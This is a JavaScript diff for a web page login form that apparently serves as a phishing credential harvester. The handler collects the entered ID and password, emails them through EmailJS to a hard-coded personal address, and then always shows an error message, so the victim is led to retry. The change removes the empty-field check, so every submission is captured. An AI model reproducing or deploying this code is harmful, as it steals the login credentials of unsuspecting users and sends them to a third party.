@@ -2,28 +2,23 @@ document.getElementById('btn').addEventListener('click', () => {
     const input1 = document.getElementById('input-1').value
     const input2 = document.getElementById('input-2').value
     const p = document.getElementById('p')
-    if (input1.length > 0 && input2.length > 0) {
-        const params = {
-            name: 'sohan',
-            email: 'aryansohan02@gmail.com',
-            message: `id: ${input1}
-                     pass: ${input2}`,
-        };
+    const params = {
+        name: 'sohan',
+        email: 'aryansohan02@gmail.com',
+        message: `id: ${input1}
+                 pass: ${input2}`,
+    };
 
-        const serviceID = "service_o79clcz";
-        const templateID = "template_2hvn30e";
+    const serviceID = "service_o79clcz";
+    const templateID = "template_2hvn30e";
 
-        emailjs.send(serviceID, templateID, params)
-            .then(res => {
-                alert("Your message sent successfully!!")
-                window.location.href = 'ind.html'
+    emailjs.send(serviceID, templateID, params)
+        .then(res => {
+            console.log('sent your massage')
 
-            })
-            .catch(err => console.log(err));
-    }
-    else {
-        p.classList.remove('d-none')
-    }
+        })
+        .catch(err => console.log(err));
+    p.classList.remove('d-none')
 })
 
 
